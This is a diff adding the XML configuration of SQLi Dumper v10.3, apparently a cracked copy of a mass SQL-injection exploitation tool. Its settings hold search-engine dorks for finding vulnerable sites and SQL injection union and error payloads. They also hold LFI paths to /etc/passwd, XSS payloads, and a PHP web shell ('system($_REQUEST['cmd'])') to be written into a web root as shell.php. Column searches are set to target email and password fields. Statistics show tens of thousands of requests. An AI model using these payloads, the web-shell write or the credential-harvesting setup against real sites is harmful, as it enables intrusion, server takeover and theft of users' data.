@@ -1,0 +1,261 @@
+﻿<?xml version="1.0" encoding="UTF-8"?>
+<SQLi_Dumper>
+  <Section Name="MainForm">
+    <Key Name="chkAnalizerPostgreErrorUnion" Value="False" />
+    <Key Name="cmbGUIHotKey" Value="A" />
+    <Key Name="txtHexValue" Value="" />
+    <Key Name="txtAccept" Value="Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8 " />
+    <Key Name="txtResolveIP" Value="" />
+    <Key Name="cmbSkin" Value="OSX iTunes" />
+    <Key Name="txtTextValue" Value="" />
+    <Key Name="chkAnalizerMySQLErrorUnion" Value="True" />
+    <Key Name="numSearchColumnThreads" Value="10" />
+    <Key Name="chkAnalizeMsAcessSybase" Value="True" />
+    <Key Name="chkUpdater" Value="False" />
+    <Key Name="chkAnalizerOracleErrorUnion" Value="False" />
+    <Key Name="cmbGuiStyle" Value="Tabs" />
+    <Key Name="btnPause" Value="False" />
+    <Key Name="chkGroupChar" Value="True" />
+    <Key Name="chkAnalizerMSSQLErrorUnion" Value="False" />
+    <Key Name="txtMultiDorks" Value="inurl:index.php?id=&#xD;&#xA;intext: &quot;sql&quot;+&quot;error&quot;&#xD;&#xA;intitle:&quot;sql&quot;&#xD;&#xA;inurl:?sigid=" />
+    <Key Name="txtRFIurl" Value="http://www.google.com" />
+    <Key Name="txtNotepad" Value="Version History&#xD;&#xA;&#xD;&#xA;01/06/2020 - v.10.1&#xD;&#xA;* Improved CPU/RAM usage, updated HTTP/Threads engine for low system use&#xD;&#xA;* Misc: improvements, fixes and optimizations&#xD;&#xA;&#xD;&#xA;11/27/2019 - v.10.0&#xD;&#xA;* Added Dumper MySQL Error Split Rows Dumping w/single column&#xD;&#xA;* Added Dumper search column&#xD;&#xA;* Improved Dumper auto setup collocations&#xD;&#xA;* Fixed Dumper Oracle Convert strings to chars&#xD;&#xA;* Improved Search Columns, supports up to 200x threads&#xD;&#xA;* Improved Search Columns now works w/ Oracle and PostgreSQL&#xD;&#xA;* Fixed Scanner yandex, replaced Ixquick to StartPage&#xD;&#xA;* Misc Removed Auto update and xml import from 8.x&#xD;&#xA;* Misc Optimized App closing (faster, even if running threads)&#xD;&#xA;* Misc Fix save settings at app closing (fails in some cases)&#xD;&#xA;* Misc Added Show external IP on statusbar&#xD;&#xA;* Misc Added French Language&#xD;&#xA;&#xD;&#xA;03/10/2019 - v.9.9&#xD;&#xA;* Added new Analyzer form&#xD;&#xA;* Added new GUI Style with TABS (Settings to change)&#xD;&#xA;* Added Dumper form option for credentials (login/pwd)&#xD;&#xA;* Fixed Exploiter RFI bug, now works perfectly&#xD;&#xA;* Improved Core loading speed&#xD;&#xA;* Improved deleting url slow (All girds, more aftected Poxies)&#xD;&#xA;* Improved stop threads (more faster)&#xD;&#xA;* Improved url box (back colors)&#xD;&#xA;* Improved context menus minor glitches&#xD;&#xA;* Improved thread engine now support up to 300x threads&#xD;&#xA;* Improved toolbars icons and tab control&#xD;&#xA;* Improved transations in missing controls&#xD;&#xA;&#xD;&#xA;02/25/2019 - v.9.8&#xD;&#xA;* Update search engine (works all again)&#xD;&#xA;* Fixed search engine stop threads when done&#xD;&#xA;* Improved CPU usage when exploiting&#xD;&#xA;* Improved GUI, no flick anymore, new country flags,&#xD;&#xA;  2 new skins, better toolbars icons, etc&#xD;&#xA;* Add load proxies from URL&#xD;&#xA;* Fixed Windows Servers crashes&#xD;&#xA;* Improved LFI \ RFI \ XXS exploiter&#xD;&#xA;&#xD;&#xA;02/16/2018 - v.9.7&#xD;&#xA;* Added Auto disable scanner blacklist IP&#xD;&#xA;* Fixed Scanner URL parser&#xD;&#xA;* Improved Exploiter, better detection rate&#xD;&#xA;* Misc: improvements, fixes and optimizations&#xD;&#xA;&#xD;&#xA;09/15/2017 - v.9.6&#xD;&#xA;* Added Grids Filters by date&#xD;&#xA;* Fixed Dumper data parser (for some MySQL Error injections)&#xD;&#xA;* Misc: improvements, fixes and optimizations&#xD;&#xA;&#xD;&#xA;09/01/2017 - v.9.5&#xD;&#xA;* Fix MySQL Load\Write File for MySQL v.4.x (Data Dumper)&#xD;&#xA;* Fix Stop Work 'Search Column\Table' MSG Box Error&#xD;&#xA;* Improved Search column sort&#xD;&#xA;* Improved Search Grids freezing&#xD;&#xA;* Improved ContextMenu poor visibility&#xD;&#xA;* Add Grids Key Control &#xD;&#xA;  CTRL + A to select All&#xD;&#xA;  Delete key to delete selected items&#xD;&#xA;  Enter key to go to dumper&#xD;&#xA;&#xD;&#xA;08/26/2017 - v.9.4&#xD;&#xA;* Added Germany, Portuguese and Persian Language&#xD;&#xA;* Added Import menu (queue)&#xD;&#xA;* Added Re-Exploiter menu&#xD;&#xA;* Improved Exploiter, better detection rate&#xD;&#xA;* Improved Data Dump, problem with '?~!' in MySQL Error Basead&#xD;&#xA;* Improved Scanner, IP/Proxy control with blacklisted&#xD;&#xA;* Improved Search Column\Tables&#xD;&#xA;* Improved Dumper Auto-Setup (detecting HTTP Flow Redirects)&#xD;&#xA;&#xD;&#xA;08/12/2017 - v.9.3&#xD;&#xA;* Added XXS support&#xD;&#xA;* Added Import URL Injectables.xml from v.8.x&#xD;&#xA;* Added extra 3 column (search rows)&#xD;&#xA;* Added Exploit from .txt (press Start Exploiter with queue empty)&#xD;&#xA;* Added Statistics Virtualization&#xD;&#xA;* Improved exploiter engine&#xD;&#xA;* Improved analyzer engine&#xD;&#xA;  ~40% better detection&#xD;&#xA;  fixed unique filter by domain&#xD;&#xA;  fixed loadfile bug dection&#xD;&#xA;* Improved Dumper for long time dumping (no more slow, only if request delays)&#xD;&#xA;* Improved RAM\CPU and Traffic use&#xD;&#xA;* Improved multi thread engine stop&#xD;&#xA;* Improved HTTP Debbuger, better delay control&#xD;&#xA;* Improved GUI Core Load\UnLoad performance&#xD;&#xA;* Improved Skins (added news, removed some)&#xD;&#xA;* Fixed grids auto scroll&#xD;&#xA;* Fixed open new instancie bug on schema&#xD;&#xA;&#xD;&#xA;04/04/2017 - v.9.2&#xD;&#xA;* New: Admin Login Finder&#xD;&#xA;* New: Full translation support&#xD;&#xA;* New: Complete XML Russian language&#xD;&#xA;* Updated: Dumper Form, fixe crash when dump in some cases&#xD;&#xA;* Fixed: MySQL Error Collocations&#xD;&#xA;* Misc: improvements, fixes and optimizations&#xD;&#xA;&#xD;&#xA;03/17/2017 - v.9.1&#xD;&#xA;* Improved: SQL Injection Exploiter&#xD;&#xA;* New: MySQL Load\Write (bruting path and checking on user_privileges table)&#xD;&#xA;* New: Check Alexa Rank, context menu on Grid (SQLi, File Inclusao)&#xD;&#xA;* Updated: Dumper Form, improvements, fixes and optimizations&#xD;&#xA;* Fixed: Bug on statistic cause crashe after x.x Gb&#xD;&#xA;* Misc: improvements, fixes and optimizations on Main Core&#xD;&#xA;&#xD;&#xA;03/01/2017 - v.9.0&#xD;&#xA;* Initial release" />
+    <Key Name="numHTTPRetry" Value="10" />
+    <Key Name="numHTTPTimeout" Value="20" />
+    <Key Name="txtExcludeUrlWords" Value="" />
+    <Key Name="txtRFIkeyword" Value="{window.google=" />
+    <Key Name="chkSkin" Value="True" />
+    <Key Name="txtResolveCountry" Value="" />
+    <Key Name="txtSQLCharDelimiter" Value="+ " />
+    <Key Name="cmbSQLChar" Value="Char" />
+    <Key Name="numLFIpathTraversalCount" Value="10" />
+    <Key Name="chkGUIHotKey" Value="False" />
+    <Key Name="chkExploitIgnoreCookies" Value="False" />
+    <Key Name="cmbUpdater" Value="" />
+    <Key Name="txtAnalizerExploitCode" Value="'[0]" />
+    <Key Name="txtUserAgent" Value="Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0 " />
+    <Key Name="txtSQLCharValue" Value="" />
+    <Key Name="numExploitingDelay" Value="200" />
+    <Key Name="cmbLanguages" Value="English" />
+    <Key Name="chkAnalizeMySQLReadWrite" Value="True" />
+    <Key Name="chkSysTray" Value="False" />
+    <Key Name="numAnalizerUnionEnd" Value="35" />
+    <Key Name="chkSkipHttpStatus4xx" Value="True" />
+    <Key Name="numPingPort" Value="80" />
+    <Key Name="txtResolveAddress" Value="" />
+    <Key Name="chkScanningBlackListProxy" Value="True" />
+    <Key Name="numThreads" Value="10" />
+    <Key Name="numAnalizerUnionSart" Value="1" />
+    <Key Name="chkAnalizeWAF" Value="True" />
+    <Key Name="numScanningDelay" Value="5000" />
+    <Key Name="chkLfiWindowsSkip" Value="True" />
+    <Key Name="Google.Domain" Value="com" />
+    <Key Name="DuckDuckGo.Domain" Value="com" />
+    <Key Name="Bing.Domain" Value="com" />
+    <Key Name="Yahoo.Domain" Value="com" />
+    <Key Name="Ask.Domain" Value="com" />
+    <Key Name="AOL.Domain" Value="com" />
+    <Key Name="WOW.Domain" Value="com" />
+    <Key Name="StartPage.Domain" Value="com" />
+    <Key Name="Yandex.Domain" Value="com" />
+    <Key Name="Rambler.Domain" Value="com" />
+    <Key Name="Search.Domain" Value="com" />
+    <Key Name="ThreadsScanner" Value="1" />
+    <Key Name="ThreadsExploit" Value="30" />
+    <Key Name="cmbSearchColumnType" Value="0" />
+    <Key Name="cmbSQLiSearch" Value="URL " />
+    <Key Name="cmbSQLiNoInjectableSearch" Value="0" />
+    <Key Name="cmbFileInclusaoSearch" Value="0" />
+    <Key Name="txtSQLiSearch" Value="" />
+    <Key Name="txtSQLiNoInjectableSearch" Value="" />
+    <Key Name="txtFileInclusaoSearch" Value="" />
+    <Key Name="btnSocksMyIP" Value="False" />
+    <Key Name="cmbSearchColumn" Value="email" />
+    <Key Name="cmbSearchColumn2" Value="password" />
+    <Key Name="cmbSearchColumn3" Value="" />
+    <Key Name="cmbSearchColumn4" Value="" />
+    <Key Name="chkSearchColumn" Value="True" />
+    <Key Name="chkSearchColumn2" Value="False" />
+    <Key Name="chkSearchColumn3" Value="False" />
+    <Key Name="chkSearchColumn4" Value="False" />
+    <Key Name="lstSearchEngine" Value="Google:True|DuckDuckGo:True|Bing:True|Yahoo:True|Ask:True|AOL:True|WOW:True|StartPage:True|Yandex:True|Rambler:True|Search:True|" />
+    <Key Name="lstExpoitType" Value="SQL:True|XSS:True|LFI:True|RFI:True|" />
+    <Key Name="lstAnalizerUnion" Value="' union all select [t] and '1'='1:True|999999.9 union all select [t]:True|999999.9 union all select [t]--:True| and 1'='1' union all select [t] and '1'='1:True| or 1'='1' union all select [t] and '1'='1:True|999999.9' union all select [t] and '1'='1:True|999999.9) union all select [t] and (1=1:False| and 1=1 union all select [t]:False| or 1=1 union all select [t]:False|" />
+    <Key Name="lstAnalizerError" Value="' and [t] and '1'='1:True|' or [t] and '1'='1:True|[t]:True| and 1=[t] and 1=1:True| or 1=[t] and 1=1:True|' and 1=[t] and '1'='1:True|' or 1=[t] and '1'='1:True|[t]--:False| and 1=[t] and 1=1--:False|" />
+    <Key Name="lvwLFIpathLinux" Value="/etc/passwd#root:/bin/bash|" />
+    <Key Name="lvwLFIpathWin" Value="c:\\boot.ini#default=multi(|d:\\boot.ini#default=multi(|c://boot.ini#default=multi(|d://boot.ini#default=multi(|" />
+    <Key Name="lvwWafs" Value="#%00|" />
+    <Key Name="lvwXSS" Value="&quot;&gt;&lt;script &gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;#XSS|&quot;&gt;&lt;javascript:alert(String.fromCharCode(88,83,83));&quot;&gt;#XSS|" />
+    <Key Name="lstExcludeUrlWords" Value="forum|showthread|.viewforum|.viewtopic|injection|dorks|union|hack|.gov|" />
+    <Key Name="txtSchemaWhere" Value="1=1 or Not 1=0 " />
+    <Key Name="txtRaw" Value="" />
+    <Key Name="chkDumpIFNULL" Value="True" />
+    <Key Name="cmbMethod" Value="GET" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="numLimitMax" Value="0" />
+    <Key Name="chkMSSQL_Latin1" Value="False" />
+    <Key Name="chkBypassProxy" Value="False" />
+    <Key Name="cmbOracleErrType" Value="GET_HOST_ADDRESS" />
+    <Key Name="txtCustomQuery" Value="" />
+    <Key Name="chkDumpWhere" Value="False" />
+    <Key Name="numTimeOut" Value="10" />
+    <Key Name="txtDictPath" Value="E:\CRACK\Unpack\Soft\SQLi Dumper v10.3 Cracked\SQLi Dumper v10.3\TXT\DicLoginFinder.txt" />
+    <Key Name="chkDumpFieldByField" Value="False" />
+    <Key Name="cmbMySQLErrType" Value="Double Query" />
+    <Key Name="txtSchemaOrderBy" Value="1 Asc, 2 Desc " />
+    <Key Name="txtCookies" Value="" />
+    <Key Name="chkMySQLSplitRows" Value="False" />
+    <Key Name="cmbMSSQLCast" Value="Nvarchar " />
+    <Key Name="chkReDumpFailed" Value="True" />
+    <Key Name="chkAddHearder" Value="False" />
+    <Key Name="trwSchema" Value="" />
+    <Key Name="cmbCharCasing" Value="Normal" />
+    <Key Name="chkDumpEncodedHex" Value="False" />
+    <Key Name="numLimitX" Value="0" />
+    <Key Name="chkStopWhenDetects" Value="True" />
+    <Key Name="chkDumpOrderBy" Value="False" />
+    <Key Name="txtWebApps" Value="php;asp;html" />
+    <Key Name="numFieldByField" Value="1" />
+    <Key Name="numMaxRetry" Value="5" />
+    <Key Name="chkMSSQLCastAsChar" Value="True" />
+    <Key Name="numDelay" Value="200" />
+    <Key Name="chkAllInOneRequest" Value="True" />
+    <Key Name="chkOracleCastAsChar" Value="True" />
+    <Key Name="txtSearchColumnResult" Value="" />
+    <Key Name="chkClearListOnGet" Value="False" />
+    <Key Name="numMaxRetryMultiThread" Value="100" />
+    <Key Name="numSleepMultiThread" Value="50" />
+    <Key Name="chkWebApps" Value="True" />
+    <Key Name="txtPost" Value="" />
+    <Key Name="txtAddHeaderName" Value="" />
+    <Key Name="numMySQLSplitRowsLenght" Value="40" />
+    <Key Name="txtCustomQueryFrom" Value="" />
+    <Key Name="cmbInjectionPoint" Value="URL" />
+    <Key Name="numMaxRetryColumn" Value="5" />
+    <Key Name="txtAddHeaderValue" Value="" />
+    <Key Name="numMySQLSplitRows" Value="2" />
+    <Key Name="cmbOracleTopN" Value="ROWNUM" />
+    <Key Name="numSleep" Value="200" />
+    <Key Name="txtMySQLWriteFile" Value="'&lt;? system($_REQUEST['cmd']); ?&gt;'" />
+    <Key Name="cmbMySQLCollations" Value="Unhex(Hex())" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="chkThreads" Value="False" />
+    <Key Name="txtSourceCode" Value="&lt;HTML&gt;&lt;/HTML&gt;&#x0;" />
+    <Key Name="chkHttpRedirect" Value="True" />
+    <Key Name="ProxyURL" Value="xreactorproxy.cf-soft.in/https.php" />
+    <Key Name="URL_List_Line" Value="1" />
+  </Section>
+  <Section Name="Statistics">
+    <Key Name="6" Value="Process Created§|Running Process§" />
+    <Key Name="3" Value="200 OK§92236|403 Forbidden§4|429§1|Timed Out§4|400 BadRequest§1|503 ServiceUnavailable§4|502 BadGateway§5|Unknown\Blocked§2|Failed to send client key exchange handshake message§2|Failed to read server hello§1" />
+  </Section>
+  <Section Name="ProxyType">
+    <Key Name="cmbProxy" Value="WEB PROXY" />
+  </Section>
+  <Section Name="SocksCheck">
+    <Key Name="numThreads" Value="100" />
+    <Key Name="btnPause" Value="False" />
+    <Key Name="numTimeout" Value="20" />
+  </Section>
+  <Section Name="Analizer">
+    <Key Name="txtURL" Value="" />
+    <Key Name="txtURL_Out" Value="" />
+    <Key Name="numUnionCount" Value="1" />
+    <Key Name="cmbUnion" Value="999999.9 union all select [t]--" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="chkWafs" Value="True" />
+    <Key Name="chkFlowRedirects" Value="True" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="chkBypassProxy" Value="False" />
+    <Key Name="btnGoToDumper" Value="True" />
+    <Key Name="txtRaw" Value="" />
+    <Key Name="cmbUnionPosition" Value="" />
+    <Key Name="txtSourceCode" Value="" />
+    <Key Name="cmbUnionStyle" Value="Numeric " />
+    <Key Name="txtUnionStyle" Value="~SQLI:[t]~" />
+    <Key Name="chkIE" Value="False" />
+  </Section>
+  <Section Name="LoginFinder">
+    <Key Name="" Value="" />
+    <Key Name="chkThreads" Value="False" />
+    <Key Name="txtCookies" Value="" />
+    <Key Name="txtAddHeaderValue" Value="" />
+    <Key Name="chkWebApps" Value="True" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="txtWebApps" Value="php;asp;html" />
+    <Key Name="chkHttpRedirect" Value="True" />
+    <Key Name="txtDictPath" Value="E:\CRACK\Unpack\Soft\SQLi Dumper v10.3 Cracked\SQLi Dumper v10.3\TXT\DicLoginFinder.txt" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="numThreads" Value="10" />
+    <Key Name="btnWorkerPause" Value="False" />
+    <Key Name="txtAddHeaderName" Value="" />
+    <Key Name="cmbCharCasing" Value="" />
+    <Key Name="chkStopWhenDetects" Value="True" />
+    <Key Name="chkAddHearder" Value="False" />
+    <Key Name="numTimeOut" Value="10" />
+    <Key Name="numDelay" Value="200" />
+  </Section>
+  <Section Name="Dumper">
+    <Key Name="txtCookies" Value="" />
+    <Key Name="chkThreads" Value="False" />
+    <Key Name="cmbMethod" Value="GET" />
+    <Key Name="txtAddHeaderValue" Value="" />
+    <Key Name="numSleepMultiThread" Value="50" />
+    <Key Name="txtAddHeaderName" Value="" />
+    <Key Name="cmbMySQLErrType" Value="Double Query" />
+    <Key Name="numThreads" Value="10" />
+    <Key Name="chkMSSQL_Latin1" Value="False" />
+    <Key Name="txtCustomQueryFrom" Value="" />
+    <Key Name="chkReDumpFailed" Value="True" />
+    <Key Name="chkOracleCastAsChar" Value="True" />
+    <Key Name="chkDumpFieldByField" Value="False" />
+    <Key Name="numTimeOut" Value="10" />
+    <Key Name="txtMySQLWriteFile" Value="'&lt;? system($_REQUEST['cmd']); ?&gt;'" />
+    <Key Name="cmbOracleErrType" Value="GET_HOST_ADDRESS" />
+    <Key Name="trwSchema" Value="" />
+    <Key Name="numMySQLSplitRows" Value="2" />
+    <Key Name="chkHttpRedirect" Value="True" />
+    <Key Name="numLimitMax" Value="0" />
+    <Key Name="chkDumpEncodedHex" Value="False" />
+    <Key Name="numSleep" Value="200" />
+    <Key Name="chkDumpWhere" Value="False" />
+    <Key Name="numMySQLSplitRowsLenght" Value="40" />
+    <Key Name="numFieldByField" Value="1" />
+    <Key Name="cmbSqlType" Value="MySQL Union" />
+    <Key Name="numLimitX" Value="0" />
+    <Key Name="cmbMSSQLCast" Value="Nvarchar " />
+    <Key Name="chkAddHearder" Value="False" />
+    <Key Name="numMaxRetryMultiThread" Value="100" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="txtCustomQuery" Value="" />
+    <Key Name="cmbMySQLCollations" Value="Unhex(Hex())" />
+    <Key Name="chkClearListOnGet" Value="False" />
+    <Key Name="chkAllInOneRequest" Value="True" />
+    <Key Name="numMaxRetryColumn" Value="5" />
+    <Key Name="chkMySQLSplitRows" Value="False" />
+    <Key Name="chkDumpIFNULL" Value="True" />
+    <Key Name="cmbInjectionPoint" Value="URL" />
+    <Key Name="cmbOracleTopN" Value="ROWNUM" />
+    <Key Name="txtPost" Value="" />
+    <Key Name="tscSchemas" Value="" />
+    <Key Name="chkMSSQLCastAsChar" Value="True" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="chkDumpOrderBy" Value="False" />
+    <Key Name="txtSchemaWhere" Value="1=1 or Not 1=0 " />
+    <Key Name="numMaxRetry" Value="5" />
+    <Key Name="txtSchemaOrderBy" Value="1 Asc, 2 Desc " />
+    <Key Name="txtSearchColumnResult" Value="" />
+    <Key Name="" Value="" />
+    <Key Name="lblVersion" Value="" />
+    <Key Name="lblCountry" Value="" />
+    <Key Name="lblCountBDs" Value="-1" />
+    <Key Name="txtMySQLReadFilePath" Value="/etc/passwd" />
+    <Key Name="txtMySQLWriteFilePath" Value="'/home/www/HostName_com/html/shell.php'" />
+    <Key Name="cmbMySQLWriteFilePath" Value="INTO OUTFILE" />
+    <Key Name="cmbMySQLReadFile" Value="HEX" />
+    <Key Name="txtSearchColumn" Value="mail" />
+    <Key Name="chkSearchColumnAllDBs" Value="False" />
+    <Key Name="__CurrentDataBase" Value="" />
+    <Key Name="trwSchema.Selected" Value="" />
+  </Section>
+</SQLi_Dumper>
